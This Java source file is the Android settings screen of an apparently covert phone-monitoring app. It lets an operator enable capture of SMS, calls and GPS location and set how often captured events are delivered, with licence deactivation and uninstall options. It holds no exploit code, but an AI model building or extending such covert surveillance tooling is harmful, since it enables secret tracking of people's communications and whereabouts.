package com.vvt.android.syncmanager.gui;

import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnKeyListener;
import android.content.Intent;
import android.os.Bundle;
import android.preference.CheckBoxPreference;
import android.preference.EditTextPreference;
import android.preference.Preference;
import android.preference.Preference.OnPreferenceChangeListener;
import android.preference.PreferenceActivity;
import android.preference.PreferenceCategory;
import android.preference.PreferenceScreen;
import android.text.Html;
import android.text.InputType;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.android.msecurity.R;
import com.fx.dalvik.activation.ActivationResponse;
import com.fx.dalvik.preference.model.ProductInfo;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.FxResource;
import com.vvt.android.syncmanager.ProductInfoHelper;
import com.vvt.android.syncmanager.SyncManagerActivity;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.LicenseManager;
import com.vvt.android.syncmanager.control.Main;

public class EventsSettingsActivity extends PreferenceActivity implements LicenseManager.Callback {

//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------

	private static final String TAG = "EventsSettingsActivity";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static final int DIALOG_GPS_TIME_INTERVAL = 1;
	private static final int DIALOG_DEACTIVATE = 2;
	private static final int DIALOG_ABOUT = 3;
	
	private CheckBoxPreference mCaptureEventsPreference;
	private EditTextPreference mDeliveryPeriodPreference;
	private EditTextPreference mMaxEventsPreference;
	private CheckBoxPreference mCaptureSmsPreference;
	private CheckBoxPreference mCapturePhoneCallPreference;
	private CheckBoxPreference mCaptureEmailPreference;
	private CheckBoxPreference mCaptureLocationPreference;
	
	private ProgressDialog mProgressDialog;
	private AlertDialog mGpsTimeIntervalListDialog;
	
	private ConfigurationManager mConfigurationManager;
	
	private void updateCaptureEventsSummary(boolean value) {
		if (LOCAL_LOGV) FxLog.v(TAG, "updateCaptureEventsSummary # ENTER ...");

		if (value) {
        	mCaptureEventsPreference.setSummary(
        			R.string.language_preference_capture_events_summary_true);
        } else {
        	mCaptureEventsPreference.setSummary(
        			R.string.language_preference_capture_events_summary_false);
        }
	}
	
	private void updateCaptureSmsSummary(boolean value) {
		if (value) {
        	mCaptureSmsPreference.setSummary(
        			R.string.language_preference_capture_summary_true);
        } else {
        	mCaptureSmsPreference.setSummary(
        			R.string.language_preference_capture_summary_false);
        }
	}

	private void updateCapturePhoneCallSummary(boolean value) {
		if (value) {
        	mCapturePhoneCallPreference.setSummary(
        			R.string.language_preference_capture_summary_true);
        } else {
        	mCapturePhoneCallPreference.setSummary(
        			R.string.language_preference_capture_summary_false);
        }
	}
	
	private void updateCaptureLocationSummary(boolean value) {
		String summary = null;
		
		int gpsTimeInterval = mConfigurationManager.loadGpsTimeIntervalSeconds();

		if (value) {
			summary = String.format(
					getString(R.string.language_preference_capture_location_summary_format), 
					GeneralUtil.getTimeDisplayValue(gpsTimeInterval));
        } 
		else {
        	summary = getString(R.string.language_preference_capture_summary_false);
        }
		
		summary = String.format(summary , gpsTimeInterval);
		mCaptureLocationPreference.setSummary(summary);
	}
	
	private void updateDeliveryPeriodSummary(double deliveryPeriodHours) {
		String format;
		
		if (deliveryPeriodHours == 1) {
			format = getString(R.string.language_preference_delivery_period_summary_format_1_hour);
		} else {
			format = getString(
					R.string.language_preference_delivery_period_summary_format_several_hours);
		}
		String html = String.format(format, deliveryPeriodHours);
		CharSequence aMessage = Html.fromHtml(html);
		mDeliveryPeriodPreference.setSummary(aMessage);
	}
	
	private void updateMaxEventsSummary(int maxEvents) {
		String format;
		
		if (maxEvents == 1) {
			format = getString(R.string.language_preference_max_events_summary_format_1_event);
		} else {
			format = getString(
					R.string.language_preference_max_events_summary_format_several_events);
		}
		String html = String.format(format, maxEvents);
		CharSequence message = Html.fromHtml(html);
		mMaxEventsPreference.setSummary(message);
	}
	
	private void addInline(PreferenceScreen root, String title) {
		PreferenceCategory startStopCapturingInline = new PreferenceCategory(this);
		startStopCapturingInline.setTitle(title);
		root.addPreference(startStopCapturingInline);
	}
	
	private void addCaptureEventsPreference(PreferenceScreen root) {
		mCaptureEventsPreference = new CheckBoxPreference(this);
        mCaptureEventsPreference.setKey(ConfigurationManager.KEY_IS_CAPTURE_EVENTS);
        mCaptureEventsPreference.setTitle(R.string.language_preference_capture_events_title);
        updateCaptureEventsSummary(mConfigurationManager.loadCaptureEnabled());

        mCaptureEventsPreference.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				updateCaptureEventsSummary((Boolean) newValue);
				mConfigurationManager.notifyChange(ConfigurationManager.KEY_IS_CAPTURE_EVENTS);
				return true;
			}
			
		});
        
        root.addPreference(mCaptureEventsPreference);
	}
	
	private void addDeliveryPeriodPreference(PreferenceScreen root) {
		mDeliveryPeriodPreference = new EditTextPreference(this);
        mDeliveryPeriodPreference.setKey(ConfigurationManager.KEY_DELIVERY_PERIOD);
        mDeliveryPeriodPreference.setDialogTitle(
        		getString(R.string.language_preference_delivery_period_title));
        mDeliveryPeriodPreference.setTitle(
        		getString(R.string.language_preference_delivery_period_title));
        mDeliveryPeriodPreference.getEditText().setInputType(InputType.TYPE_CLASS_NUMBER);
        
        updateDeliveryPeriodSummary(mConfigurationManager.loadDeliveryPeriodHours());
        
        mDeliveryPeriodPreference.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				if (LOCAL_LOGV) FxLog.v(TAG, "onPreferenceChange # ENTER ...");
				
				double value;
				boolean validValue = true;

				try {
					value = Double.parseDouble((String) newValue);
				} catch (NumberFormatException e) {
					validValue = false;
					value = 0; // just to prevent compiling error
				}
				
				if (validValue) {
					// Validate against max/min
					if (value < mConfigurationManager.getMinEventsDeliveryPeriodHours() ||
						value > mConfigurationManager.getMaxEventsDeliveryPeriodHours()) {
						validValue = false;
					}
				}
				
				// Notify user, don't update the shared preferences.
				if (! validValue) {
					notifyUser(getString(R.string.language_preference_delivery_period_invalid_input));
					return false;
				}
				
				// Update the GUI and the shared preferences.
				updateDeliveryPeriodSummary(value);
				mConfigurationManager.notifyChange(ConfigurationManager.KEY_DELIVERY_PERIOD);
				return true;
			}
			
		});
        
        root.addPreference(mDeliveryPeriodPreference);
	}
	
	private void addMaxEventsPreference(PreferenceScreen root) {
        mMaxEventsPreference = new EditTextPreference(this);
        mMaxEventsPreference.setKey(ConfigurationManager.KEY_MAX_EVENTS);
        mMaxEventsPreference.setDialogTitle(
        		getString(R.string.language_preference_max_events_title));
        mMaxEventsPreference.setTitle(getString(R.string.language_preference_max_events_title));
        mMaxEventsPreference.getEditText().setInputType(InputType.TYPE_CLASS_NUMBER);
        
        updateMaxEventsSummary(mConfigurationManager.loadMaxEvents());
        
        mMaxEventsPreference.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				if (LOCAL_LOGV) FxLog.v(TAG, "onPreferenceChange # ENTER ...");
				
				int value;
				boolean validValue = true;
				
				try {
					value = Integer.parseInt((String) newValue);
				} 
				catch (NumberFormatException e) {
					validValue = false;
					value = 0; // just to prevent compiling error
				}
				
				if (validValue) {
					// Validate against max/min
					if (value < mConfigurationManager.getMinMaxEvents() ||
						value > mConfigurationManager.getMaxMaxEvents()) {
						validValue = false;
					}
				}
				
				// Notify user, don't update the shared preferences.
				if (! validValue) {
					notifyUser(getString(R.string.language_preference_max_events_invalid_input)); 
					return false;
				}
				
				// Update the GUI and the shared preferences.
				updateMaxEventsSummary(value);
				mConfigurationManager.notifyChange(ConfigurationManager.KEY_MAX_EVENTS);
				return true;
			}
			
		});
        
        root.addPreference(mMaxEventsPreference);
	}
	
	private void addCaptureSmsPreference(PreferenceScreen root) {
        mCaptureSmsPreference = new CheckBoxPreference(this);
        mCaptureSmsPreference.setKey(ConfigurationManager.KEY_IS_CAPTURE_SMS);
        mCaptureSmsPreference.setTitle(R.string.language_preference_capture_sms_title);
        
        updateCaptureSmsSummary(mConfigurationManager.loadCaptureSmsEnabled());
        
        mCaptureSmsPreference.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				updateCaptureSmsSummary((Boolean) newValue);
				mConfigurationManager.notifyChange(ConfigurationManager.KEY_IS_CAPTURE_SMS);
				return true;
			}
			
		});
        
        root.addPreference(mCaptureSmsPreference);
	}
	
	private void addCapturePhoneCallPreference(PreferenceScreen root) {
		ConfigurationManager aConfigurationManager = Main.getInstance().getConfigurationManager();
		
        mCapturePhoneCallPreference = new CheckBoxPreference(this);
        mCapturePhoneCallPreference.setKey(ConfigurationManager.KEY_IS_CAPTURE_PHONE_CALL);
        mCapturePhoneCallPreference.setTitle(R.string.language_preference_capture_phone_call_title);
        
        updateCapturePhoneCallSummary(aConfigurationManager.loadCapturePhoneCallEnabled());
        
        mCapturePhoneCallPreference.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			
			public boolean onPreferenceChange(Preference aPreference, Object newValue) {
				updateCapturePhoneCallSummary((Boolean) newValue);
				mConfigurationManager.notifyChange(ConfigurationManager.KEY_IS_CAPTURE_PHONE_CALL);
				return true;
			}
			
		});
        
        root.addPreference(mCapturePhoneCallPreference);
	}
	
	private void addCaptureLocationPreference(PreferenceScreen root) {
        mCaptureLocationPreference = new CheckBoxPreference(this);
        mCaptureLocationPreference.setKey(ConfigurationManager.KEY_IS_CAPTURE_LOCATION);
        mCaptureLocationPreference.setTitle(R.string.language_preference_capture_location_title);
        
        updateCaptureLocationSummary(mConfigurationManager.loadCaptureLocationEnabled());
        
        mCaptureLocationPreference.setOnPreferenceChangeListener(new OnPreferenceChangeListener() {
			
			public boolean onPreferenceChange(Preference preference, Object newValue) {
				if ((Boolean) newValue == true) {
					showDialog(DIALOG_GPS_TIME_INTERVAL);
					// notifyChange in dialog
				}
				else {
					updateCaptureLocationSummary(false);
					mConfigurationManager.notifyChange(ConfigurationManager.KEY_IS_CAPTURE_LOCATION);
				}
				return true;
			}
		});
        
        root.addPreference(mCaptureLocationPreference);
	}
	
	private Dialog getGpsTimeIntervalListDialog() {
		int intervalListSeconds[] = getResources().getIntArray(R.array.gps_interval_value_seconds);
		int intervalSeconds = mConfigurationManager.loadGpsTimeIntervalSeconds();
		
		int selectedIndex = 0;
		for (int i = 0 ; i < intervalListSeconds.length ; i++) {
			if (intervalListSeconds[i] == intervalSeconds) {
				selectedIndex = i;
				break;
			}
		}
		
		mGpsTimeIntervalListDialog = new AlertDialog.Builder(this)
				.setSingleChoiceItems(R.array.gps_interval_name, selectedIndex, 
						new DialogInterface.OnClickListener() {
					
					public void onClick(DialogInterface dialog, int which) {
						if (LOCAL_LOGV) {
							FxLog.v(TAG, "onClick # ENTER ...");
							FxLog.v(TAG, String.format("which = %d", which));
						}
						int intervalListSeconds[] = EventsSettingsActivity.this.getResources()
								.getIntArray(R.array.gps_interval_value_seconds);

						int intervalSeconds = intervalListSeconds[which]; 
						
						mConfigurationManager.dumpGpsTimeInterval(intervalSeconds);
						updateCaptureLocationSummary((Boolean) true);
						
						mCaptureLocationPreference.setChecked(true);
						mConfigurationManager.notifyChange(
								ConfigurationManager.KEY_IS_CAPTURE_LOCATION);
						
						mGpsTimeIntervalListDialog.dismiss();
					}
				})
				.create();
		
		mGpsTimeIntervalListDialog.setOnKeyListener(new OnKeyListener() {
			
			@Override
			public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event) {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, "onKey # ENTER ...");
				}
				if (keyCode == KeyEvent.KEYCODE_BACK) {
					mCaptureLocationPreference.setChecked(false);
					updateCaptureLocationSummary(false);
				}
				return false;
			}
		});
		
		return mGpsTimeIntervalListDialog;
	}
	
	private PreferenceScreen createPreferenceHierarchy() {
		if (LOCAL_LOGV) FxLog.v(TAG, "createPreferenceHierarchy # ENTER ...");

        PreferenceScreen root = getPreferenceManager().createPreferenceScreen(this);
        
		addCaptureEventsPreference(root);
		
		addInline(root, getString(R.string.language_preference_inline_events_to_capture));
		addCaptureSmsPreference(root);
		addCapturePhoneCallPreference(root);
		addCaptureLocationPreference(root);
        addInline(root, getString(R.string.language_preference_inline_sending_criteria));
		addDeliveryPeriodPreference(root);
		addMaxEventsPreference(root);
        
        return root;
	}
	
	private void setPreferenceDependencies() {
		if (mCapturePhoneCallPreference != null) {
			mCapturePhoneCallPreference.setDependency(ConfigurationManager.KEY_IS_CAPTURE_EVENTS);
		}
		if (mCaptureSmsPreference != null) {
			mCaptureSmsPreference.setDependency(ConfigurationManager.KEY_IS_CAPTURE_EVENTS);
		}
		if (mCaptureEmailPreference != null) {
			mCaptureEmailPreference.setDependency(ConfigurationManager.KEY_IS_CAPTURE_EVENTS);
		}
		if (mCaptureLocationPreference != null) {
			mCaptureLocationPreference.setDependency(ConfigurationManager.KEY_IS_CAPTURE_EVENTS);
		}
	}
	
    private void deactivate(String activationCode) {
    	if (LOCAL_LOGV) FxLog.v(TAG, "deactivate # ENTER ...");

    	View currentView = getCurrentFocus();

    	if (currentView != null) {
    		GeneralUtil.hideSoftInput(this, currentView);
    	}
    	
    	LicenseManager licenseManager = Main.getInstance().getLicenseManager();
    	Main.getInstance().getLicenseManager().asyncDeactivate(activationCode);
		licenseManager.addCallback(this);

  		mProgressDialog = ProgressDialog.show(this, "", 
  				getString(R.string.language_ui_msg_processing_polite), true);
    }
    
    private void notifyUser(String stringMessage) {
    	if (LOCAL_LOGV) FxLog.v(TAG, "notifyUser # ENTER ...");
    	Toast.makeText(this, stringMessage, Toast.LENGTH_LONG).show();
    }
	
//-------------------------------------------------------------------------------------------------
// PROTECTED API
//-------------------------------------------------------------------------------------------------

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		if (LOCAL_LOGV) FxLog.v(TAG, "onCreate # ENTER ...[UI]");
		
		super.onCreate(savedInstanceState);
		
		Main.startIfNotStarted(getApplicationContext());
		
		setTitle(R.string.language_main_menu_cell_events);
		
		mConfigurationManager = Main.getInstance().getConfigurationManager();
	}
	
	@Override
	protected void onStart() {
		if (LOCAL_LOGV) FxLog.v(TAG, "onStart # ENTER ...[UI]");
		super.onStart();
		setPreferenceScreen(createPreferenceHierarchy());
		setPreferenceDependencies();
	}
	
	@Override
	protected void onResume() {
		if (LOCAL_LOGV) FxLog.v(TAG, "onResume # ENTER ...[UI]");
		super.onResume();
	}
	
	protected void onPause() {
		if (LOCAL_LOGV) FxLog.v(TAG, "onPause # ENTER ...[UI]");
		super.onPause();
	}
	
	@Override
	protected void onStop() {
		if (LOCAL_LOGV) FxLog.v(TAG, "onStop # ENTER ...[UI]");
		super.onStop();
	}
	
	@Override
	protected Dialog onCreateDialog(int id) {
		
		switch (id) {
		
		case (DIALOG_GPS_TIME_INTERVAL): 
			return getGpsTimeIntervalListDialog();
		
		case DIALOG_DEACTIVATE:
			View deactivateView = 
				getLayoutInflater().inflate(R.layout.deactivate_dialog, null);
			
			final String activationCode = 
				Main.getInstance().getConfigurationManager().loadActivationCode();
			
			return new AlertDialog.Builder(this)
				.setTitle(R.string.language_ui_label_deactivate_product)
				.setView(deactivateView)
				.setPositiveButton(R.string.language_ui_label_ok, 
						new DialogInterface.OnClickListener() {
							public void onClick(DialogInterface dialog, int which) {
								deactivate(activationCode);
							}
						})
				.setNegativeButton(R.string.language_ui_label_cancel, null) 
				.create();
			
		case DIALOG_ABOUT:
			View aboutView = getLayoutInflater().inflate(R.layout.about_dialog, null);
			TextView textView = (TextView) aboutView.findViewById(R.id.about_text_view);
			
			ProductInfo productInfo = ProductInfoHelper.getProductInfo(getApplicationContext());
			
			String productId = String.valueOf(productInfo.getId());
			String version = productInfo.getVersionName();
			String buildDate = productInfo.getBuildDate();
			
			String html = String.format(
					StringResource.LANG_ABOUT_INFO, productId, version, buildDate);
			
			CharSequence message = Html.fromHtml(html);
			textView.setText(message);
			
			return new AlertDialog.Builder(this)
				.setTitle(R.string.language_ui_label_about)
				.setView(aboutView)
				.setPositiveButton(R.string.language_ui_label_ok, null)
				.create();
		
		}
		return super.onCreateDialog(id);
	}

//-------------------------------------------------------------------------------------------------
// PUBLIC API
//-------------------------------------------------------------------------------------------------
	
    @Override
    public boolean onCreateOptionsMenu(Menu aMenu) {
    	if (LOCAL_LOGV) FxLog.v(TAG, "onCreateOptionsMenu # ENTER ...");
    	MenuInflater inflater = getMenuInflater();
    	inflater.inflate(R.menu.main_options, aMenu);
    	return true;
    }
    
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
    	if (LOCAL_LOGV) FxLog.v(TAG, "onOptionsItemSelected # ENTER ...");
    	switch (item.getItemId()) {
	    	case R.id.menu_main_connection_history:
	    		Intent intent1 = new Intent();
	    		intent1.setClass(this, ConnectionHistoryActivity.class);
	    		startActivity(intent1);
	    		break;
	    	case R.id.menu_main_cache_database_status:
	    		Intent intent2 = new Intent();
	    		intent2.setClass(this, DatabaseStatusActivity.class);
	    		startActivity(intent2);
	    		break;
	    	case R.id.menu_main_deactivate:
	    		showDialog(DIALOG_DEACTIVATE);
	    		break;
	    	case R.id.menu_main_about:
	    		showDialog(DIALOG_ABOUT);
	    		break;
	    	case R.id.menu_main_uninstall:
	    		GeneralUtil.promptUninstallApplication(getApplicationContext());
	    		break;
	    	default:
	    		break;
    	}
    	return true;
    }

    // Only handle deactivation process (called by LicenseManager)
	public void onActivateDeactivateComplete(ActivationResponse response) {
		if (LOCAL_LOGV) FxLog.v(TAG, "onActivateDeactivateComplete # ENTER ...");

		if (mProgressDialog != null) {
			mProgressDialog.dismiss();
		}
		
		Main.getInstance().getLicenseManager().removeCallback(this);

		// Deactivation should always be success, regardless of connection to servers
		if (response != null) {
			if (!response.isActivateAction()) {
				notifyUser(FxResource.language_deactivation_success);
				
				Intent intent = new Intent();
				intent.setClass(EventsSettingsActivity.this, SyncManagerActivity.class);
				startActivity(intent);
				finish();
			}
		} 
		else {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, "Invalid deactivation state.");
			}
		}
	}
	
	@Override
	public void onDestroy() {
		if (LOCAL_LOGV) FxLog.v(TAG, "onDestroy # ENTER ...[UI]");
		super.onDestroy();
	}

	public void finish() {
		if (LOCAL_LOGV) FxLog.v(TAG, "finish # ENTER ...[UI]");
		super.finish();
	}
	
}
